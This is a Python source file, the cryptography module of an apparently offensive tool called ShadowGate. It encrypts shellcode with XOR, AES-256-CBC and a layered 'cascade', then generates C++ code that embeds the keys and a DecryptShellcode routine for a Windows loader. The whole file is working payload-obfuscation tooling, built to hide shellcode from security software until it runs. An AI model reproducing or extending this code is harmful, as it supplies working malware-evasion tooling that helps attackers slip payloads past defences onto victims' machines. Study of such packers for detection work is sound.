"""
ShadowGate - Cryptography Module
Handles shellcode encryption: XOR, AES-256-CBC, Cascade
"""

import os
import struct
from typing import Tuple, Optional
from dataclasses import dataclass

# Try to import pycryptodome
try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("[!] PyCryptodome not found. Install with: pip install pycryptodome")
    print("[*] AES encryption will be unavailable, falling back to XOR only")


# ============================================================================
# Key Container
# ============================================================================

@dataclass
class CryptoKeys:
    """Container for encryption keys"""
    xor_key: bytes = None
    aes_key: bytes = None
    aes_iv: bytes = None
    
    def __post_init__(self):
        if self.xor_key is None:
            self.xor_key = os.urandom(32)
        if self.aes_key is None:
            self.aes_key = os.urandom(32)  # AES-256
        if self.aes_iv is None:
            self.aes_iv = os.urandom(16)   # AES block size


# ============================================================================
# Crypto Engine
# ============================================================================

class CryptoEngine:
    """Handles all encryption operations"""
    
    def __init__(self):
        self.keys = None
    
    def generate_keys(self, xor_key_size: int = 32) -> CryptoKeys:
        """Generate new random encryption keys"""
        self.keys = CryptoKeys(
            xor_key=os.urandom(xor_key_size),
            aes_key=os.urandom(32),
            aes_iv=os.urandom(16)
        )
        return self.keys
    
    def set_keys(self, keys: CryptoKeys):
        """Set encryption keys"""
        self.keys = keys
    
    # ========================================================================
    # XOR Encryption
    # ========================================================================
    
    def xor_encrypt(self, data: bytes, key: bytes = None) -> bytes:
        """
        XOR encryption with repeating key
        Symmetric - same function for encrypt/decrypt
        """
        if key is None:
            if self.keys is None:
                self.generate_keys()
            key = self.keys.xor_key
        
        result = bytearray(len(data))
        key_len = len(key)
        
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % key_len]
        
        return bytes(result)
    
    def xor_decrypt(self, data: bytes, key: bytes = None) -> bytes:
        """XOR decryption (same as encryption)"""
        return self.xor_encrypt(data, key)
    
    # ========================================================================
    # AES-256-CBC Encryption
    # ========================================================================
    
    def aes_encrypt(self, data: bytes, key: bytes = None, iv: bytes = None) -> bytes:
        """
        AES-256-CBC encryption with PKCS7 padding
        """
        if not CRYPTO_AVAILABLE:
            print("[!] AES not available, returning original data")
            return data
        
        if key is None:
            if self.keys is None:
                self.generate_keys()
            key = self.keys.aes_key
        
        if iv is None:
            iv = self.keys.aes_iv
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        padded_data = pad(data, AES.block_size)
        encrypted = cipher.encrypt(padded_data)
        
        return encrypted
    
    def aes_decrypt(self, data: bytes, key: bytes = None, iv: bytes = None) -> bytes:
        """
        AES-256-CBC decryption
        """
        if not CRYPTO_AVAILABLE:
            print("[!] AES not available, returning original data")
            return data
        
        if key is None:
            if self.keys is None:
                raise ValueError("No keys available for decryption")
            key = self.keys.aes_key
        
        if iv is None:
            iv = self.keys.aes_iv
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data)
        unpadded = unpad(decrypted, AES.block_size)
        
        return unpadded
    
    # ========================================================================
    # Byte Reversal
    # ========================================================================
    
    @staticmethod
    def reverse_bytes(data: bytes) -> bytes:
        """Reverse byte order"""
        return data[::-1]
    
    # ========================================================================
    # Cascade Encryption (XOR -> AES -> Reverse)
    # ========================================================================
    
    def cascade_encrypt(self, data: bytes) -> bytes:
        """
        Multi-layer cascade encryption:
        Layer 1: XOR with random key
        Layer 2: AES-256-CBC
        Layer 3: Reverse byte order
        """
        if self.keys is None:
            self.generate_keys()
        
        # Layer 1: XOR
        layer1 = self.xor_encrypt(data)
        
        # Layer 2: AES (if available)
        if CRYPTO_AVAILABLE:
            layer2 = self.aes_encrypt(layer1)
        else:
            layer2 = layer1
        
        # Layer 3: Reverse
        layer3 = self.reverse_bytes(layer2)
        
        return layer3
    
    def cascade_decrypt(self, data: bytes) -> bytes:
        """
        Decrypt cascade encryption (reverse order)
        """
        if self.keys is None:
            raise ValueError("No keys available for decryption")
        
        # Layer 3: Un-reverse
        layer3 = self.reverse_bytes(data)
        
        # Layer 2: AES decrypt
        if CRYPTO_AVAILABLE:
            layer2 = self.aes_decrypt(layer3)
        else:
            layer2 = layer3
        
        # Layer 1: XOR decrypt
        layer1 = self.xor_decrypt(layer2)
        
        return layer1
    
    # ========================================================================
    # Encrypt Method Dispatcher
    # ========================================================================
    
    def encrypt(self, data: bytes, method: str = "cascade") -> bytes:
        """
        Encrypt data using specified method
        
        Args:
            data: Raw shellcode bytes
            method: 'xor', 'aes', or 'cascade'
        
        Returns:
            Encrypted bytes
        """
        if self.keys is None:
            self.generate_keys()
        
        if method == "xor":
            return self.xor_encrypt(data)
        elif method == "aes":
            if not CRYPTO_AVAILABLE:
                print("[!] AES not available, using XOR instead")
                return self.xor_encrypt(data)
            # XOR first, then AES for added security
            xored = self.xor_encrypt(data)
            return self.aes_encrypt(xored)
        elif method == "cascade":
            return self.cascade_encrypt(data)
        else:
            raise ValueError(f"Unknown encryption method: {method}")
    
    def decrypt(self, data: bytes, method: str = "cascade") -> bytes:
        """
        Decrypt data using specified method
        """
        if self.keys is None:
            raise ValueError("No keys available for decryption")
        
        if method == "xor":
            return self.xor_decrypt(data)
        elif method == "aes":
            if not CRYPTO_AVAILABLE:
                return self.xor_decrypt(data)
            aes_decrypted = self.aes_decrypt(data)
            return self.xor_decrypt(aes_decrypted)
        elif method == "cascade":
            return self.cascade_decrypt(data)
        else:
            raise ValueError(f"Unknown decryption method: {method}")
    
    # ========================================================================
    # C++ Code Generation
    # ========================================================================
    
    def generate_cpp_keys(self) -> str:
        """Generate C++ code for decryption keys"""
        if self.keys is None:
            self.generate_keys()
        
        lines = []
        lines.append("// ============================================================================")
        lines.append("// Decryption Keys (Auto-generated)")
        lines.append("// ============================================================================\n")
        
        # XOR Key
        xor_hex = ', '.join(f'0x{b:02X}' for b in self.keys.xor_key)
        lines.append(f"unsigned char g_XorKey[] = {{ {xor_hex} }};")
        lines.append(f"SIZE_T g_XorKeyLen = {len(self.keys.xor_key)};")
        lines.append("")
        
        # AES Key (if available)
        if CRYPTO_AVAILABLE:
            aes_key_hex = ', '.join(f'0x{b:02X}' for b in self.keys.aes_key)
            aes_iv_hex = ', '.join(f'0x{b:02X}' for b in self.keys.aes_iv)
            
            lines.append(f"unsigned char g_AesKey[] = {{ {aes_key_hex} }};")
            lines.append(f"SIZE_T g_AesKeyLen = {len(self.keys.aes_key)};")
            lines.append("")
            lines.append(f"unsigned char g_AesIv[] = {{ {aes_iv_hex} }};")
            lines.append(f"SIZE_T g_AesIvLen = {len(self.keys.aes_iv)};")
            lines.append("")
            lines.append("#define USE_AES_DECRYPTION 1")
        else:
            lines.append("#define USE_AES_DECRYPTION 0")
        
        return '\n'.join(lines)
    
    def generate_cpp_decrypt_functions(self, method: str = "cascade") -> str:
        """Generate C++ decryption functions"""
        
        code = '''
// ============================================================================
// Decryption Functions
// ============================================================================

// XOR Decryption
void XorDecrypt(unsigned char* data, SIZE_T dataLen, unsigned char* key, SIZE_T keyLen) {
    for (SIZE_T i = 0; i < dataLen; i++) {
        data[i] ^= key[i % keyLen];
    }
}

// Reverse Bytes
void ReverseBytes(unsigned char* data, SIZE_T dataLen) {
    SIZE_T i = 0;
    SIZE_T j = dataLen - 1;
    while (i < j) {
        unsigned char temp = data[i];
        data[i] = data[j];
        data[j] = temp;
        i++;
        j--;
    }
}

#if USE_AES_DECRYPTION
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

BOOL AesDecrypt(
    unsigned char* pCiphertext, SIZE_T cipherLen,
    unsigned char* pKey, SIZE_T keyLen,
    unsigned char* pIv, SIZE_T ivLen,
    unsigned char* pPlaintext, SIZE_T* pPlainLen
) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    BOOL result = FALSE;
    
    // Open algorithm provider
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!NT_SUCCESS(status)) goto cleanup;
    
    // Set CBC mode
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                               (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
                               sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!NT_SUCCESS(status)) goto cleanup;
    
    // Generate key
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, pKey, (ULONG)keyLen, 0);
    if (!NT_SUCCESS(status)) goto cleanup;
    
    // Decrypt
    ULONG resultLen = 0;
    status = BCryptDecrypt(hKey, pCiphertext, (ULONG)cipherLen, NULL,
                          pIv, (ULONG)ivLen, pPlaintext, (ULONG)cipherLen,
                          &resultLen, BCRYPT_BLOCK_PADDING);
    if (!NT_SUCCESS(status)) goto cleanup;
    
    *pPlainLen = resultLen;
    result = TRUE;
    
cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return result;
}
#endif
'''
        
        # Add method-specific decryption wrapper
        if method == "xor":
            code += '''
// Main Decryption Function (XOR only)
BOOL DecryptShellcode(unsigned char* pEncrypted, SIZE_T encLen,
                      unsigned char** ppDecrypted, SIZE_T* pDecLen) {
    *ppDecrypted = (unsigned char*)VirtualAlloc(NULL, encLen,
                                                 MEM_COMMIT | MEM_RESERVE,
                                                 PAGE_READWRITE);
    if (!*ppDecrypted) return FALSE;
    
    memcpy(*ppDecrypted, pEncrypted, encLen);
    XorDecrypt(*ppDecrypted, encLen, g_XorKey, g_XorKeyLen);
    *pDecLen = encLen;
    
    return TRUE;
}
'''
        elif method == "aes":
            code += '''
// Main Decryption Function (AES + XOR)
BOOL DecryptShellcode(unsigned char* pEncrypted, SIZE_T encLen,
                      unsigned char** ppDecrypted, SIZE_T* pDecLen) {
    
    // Allocate buffer
    unsigned char* pBuffer = (unsigned char*)VirtualAlloc(NULL, encLen + 32,
                                                          MEM_COMMIT | MEM_RESERVE,
                                                          PAGE_READWRITE);
    if (!pBuffer) return FALSE;
    
#if USE_AES_DECRYPTION
    // AES decrypt first
    unsigned char ivCopy[16];
    memcpy(ivCopy, g_AesIv, 16);
    
    SIZE_T aesDecLen = 0;
    if (!AesDecrypt(pEncrypted, encLen, g_AesKey, g_AesKeyLen,
                    ivCopy, g_AesIvLen, pBuffer, &aesDecLen)) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    // Then XOR decrypt
    XorDecrypt(pBuffer, aesDecLen, g_XorKey, g_XorKeyLen);
    *pDecLen = aesDecLen;
#else
    // XOR only fallback
    memcpy(pBuffer, pEncrypted, encLen);
    XorDecrypt(pBuffer, encLen, g_XorKey, g_XorKeyLen);
    *pDecLen = encLen;
#endif
    
    *ppDecrypted = pBuffer;
    return TRUE;
}
'''
        else:  # cascade
            code += '''
// Main Decryption Function (Cascade: Reverse -> AES -> XOR)
BOOL DecryptShellcode(unsigned char* pEncrypted, SIZE_T encLen,
                      unsigned char** ppDecrypted, SIZE_T* pDecLen) {
    
    // Allocate buffer
    unsigned char* pBuffer = (unsigned char*)VirtualAlloc(NULL, encLen + 32,
                                                          MEM_COMMIT | MEM_RESERVE,
                                                          PAGE_READWRITE);
    if (!pBuffer) return FALSE;
    
    memcpy(pBuffer, pEncrypted, encLen);
    
    // Layer 3: Reverse bytes
    ReverseBytes(pBuffer, encLen);
    
#if USE_AES_DECRYPTION
    // Layer 2: AES decrypt
    unsigned char* pAesBuffer = (unsigned char*)VirtualAlloc(NULL, encLen + 32,
                                                              MEM_COMMIT | MEM_RESERVE,
                                                              PAGE_READWRITE);
    if (!pAesBuffer) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    unsigned char ivCopy[16];
    memcpy(ivCopy, g_AesIv, 16);
    
    SIZE_T aesDecLen = 0;
    if (!AesDecrypt(pBuffer, encLen, g_AesKey, g_AesKeyLen,
                    ivCopy, g_AesIvLen, pAesBuffer, &aesDecLen)) {
        VirtualFree(pBuffer, 0, MEM_RELEASE);
        VirtualFree(pAesBuffer, 0, MEM_RELEASE);
        return FALSE;
    }
    
    VirtualFree(pBuffer, 0, MEM_RELEASE);
    pBuffer = pAesBuffer;
    encLen = aesDecLen;
#endif
    
    // Layer 1: XOR decrypt
    XorDecrypt(pBuffer, encLen, g_XorKey, g_XorKeyLen);
    
    *ppDecrypted = pBuffer;
    *pDecLen = encLen;
    return TRUE;
}
'''
        
        return code


# ============================================================================
# Test
# ============================================================================

if __name__ == "__main__":
    engine = CryptoEngine()
    
    # Test data
    test_data = b"Hello, ShadowGate! This is a test payload."
    print(f"Original: {test_data}")
    print(f"Original length: {len(test_data)}")
    
    # Generate keys
    keys = engine.generate_keys()
    print(f"\nXOR Key: {keys.xor_key.hex()}")
    print(f"AES Key: {keys.aes_key.hex()}")
    print(f"AES IV:  {keys.aes_iv.hex()}")
    
    # Test XOR
    print("\n--- XOR Encryption ---")
    xor_enc = engine.encrypt(test_data, "xor")
    xor_dec = engine.decrypt(xor_enc, "xor")
    print(f"Encrypted: {xor_enc.hex()[:64]}...")
    print(f"Decrypted: {xor_dec}")
    print(f"Match: {test_data == xor_dec}")
    
    # Test AES
    if CRYPTO_AVAILABLE:
        print("\n--- AES Encryption ---")
        aes_enc = engine.encrypt(test_data, "aes")
        aes_dec = engine.decrypt(aes_enc, "aes")
        print(f"Encrypted: {aes_enc.hex()[:64]}...")
        print(f"Decrypted: {aes_dec}")
        print(f"Match: {test_data == aes_dec}")
    
    # Test Cascade
    print("\n--- Cascade Encryption ---")
    cas_enc = engine.encrypt(test_data, "cascade")
    cas_dec = engine.decrypt(cas_enc, "cascade")
    print(f"Encrypted: {cas_enc.hex()[:64]}...")
    print(f"Decrypted: {cas_dec}")
    print(f"Match: {test_data == cas_dec}")
    
    # Generate C++ code
    print("\n--- Generated C++ Keys ---")
    print(engine.generate_cpp_keys())